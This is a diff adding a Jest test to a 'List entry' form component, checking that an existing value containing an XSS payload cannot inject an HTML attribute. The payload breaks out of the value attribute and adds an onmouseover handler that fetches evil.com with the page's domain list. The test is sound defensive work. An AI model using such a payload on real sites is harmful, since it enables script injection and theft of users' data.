@@ -304,6 +304,26 @@ describe("List entry", () => {
 
     });
 
+    test("If an existing entry has a value containing a Cross-Site-Scripting (XSS) attack, it cannot rewrite the document's HTML", () => {
+
+      setFieldValues(7);
+
+      const domainsList = domains.join(',');
+      const unescapedValue = `dfe.gov.uk" onmouseover="fetch('https://evil.com?domains=${domainsList}')`
+      const escapedValue = `dfe.gov.uk&#34; onmouseover=&#34;fetch(&#39;https://evil.com?domains=${domainsList}&#39;)`
+
+      inputList.querySelectorAll('.list-entry .govuk-input')[0].setAttribute(
+        'value', `dfe.gov.uk" onmouseover="fetch('https://evil.com?domains=${domainsList}')`
+      );
+
+      // start module
+      const _listEntry = new ListEntry(inputList);
+      const entryWithAttack = inputList.querySelectorAll('.list-entry .govuk-input')[0];
+
+      expect(entryWithAttack.getAttribute('onmouseover')).toBeNull();
+
+    });
+
   });
 
   describe("When the 'remove' button is clicked", () => {
